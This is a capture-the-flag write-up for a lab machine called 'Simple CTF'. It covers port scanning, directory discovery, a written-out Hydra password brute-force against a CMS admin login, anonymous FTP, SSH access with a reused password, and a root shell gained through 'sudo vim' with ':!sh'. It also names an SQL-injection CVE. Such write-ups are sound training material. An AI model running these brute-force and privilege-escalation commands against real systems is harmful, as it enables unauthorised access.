# Simple CTF

The used IP addresses change, because I re-deployed the target machine several times.

## Step 1: Nmap Scan

- scanning for ports in general 

![Pasted image 20250706223739.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250706223739.png)


- EtherNetIP-1 is on port 2222, that's above port 1000, so there are 2 services running below port 1000.
- **How many services are running under port 1000? - 2**

- Doing the portscan again with service/version detection, we get
  
![Pasted image 20250706231210.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250706231210.png)

- **What is running on the higher port? - ssh**

## Step2: ZAP scan
- first normal spider
- then forced browse site with `directory-list-2.3-medium.txt`
- we find `http://10.10.129.58/simple/`
	- on here we see a news post made by someone named mitch
- we also find `http://10.10.129.58/simple/admin/login.php` (which can also be found as a link on the /simple page)


## Step 3: Hydra Password Bruteforce with Username mitch

`sudo hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.91.200 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect" -V`


![Pasted image 20250708215042.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250708215042.png)

## Step 3: FTP Server
- you can login to the ftp server without credentials
- on the ftp server is a directory called pub, which contains a file called `ForMitch.txt`

The file says:
![Pasted image 20250708221812.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250708221812.png)
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

## Step 4: SSH
- the ssh doesn't react when we try to log in
- with `ssh -vvv mitch@10.10.1.91` we see why: it tries to connect to port 22, but the ssh is running on port 2222
- log in with `ssh -p 2222 mitch@10.10.1.91`
- the user.txt file has the flag

## Step 5: Privilege Escalation
- see what the user can run with sudo `sudo -l`
- user can run vim with sudo
- ![Pasted image 20250708224438.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250708224438.png)
- start vim
	- `sudo vim`
- then escape to shell from vim by typing  `:!sh` in vim 
- ![Pasted image 20250708224625.png](https://github.com/gernia/CTF_writeups/blob/main/Simple%20CTF/imgs/Pasted%20image%2020250708224625.png)
- navigate to folder named root, in `root.txt` is the flag 

## Step 5: Remaining Questions
- there are still two remaining questions
- **What's the CVE you're using against the application?**
- **To what kind of vulnerability is the application vulnerable?**
- we can find the CVE by searching for "CMS Made Simple Version 2.2.8 vulnerability" and find **CVE-2019-9053** which states, that CMS Made Simple <2.2.10 is vulnerable to **SQL Injection**
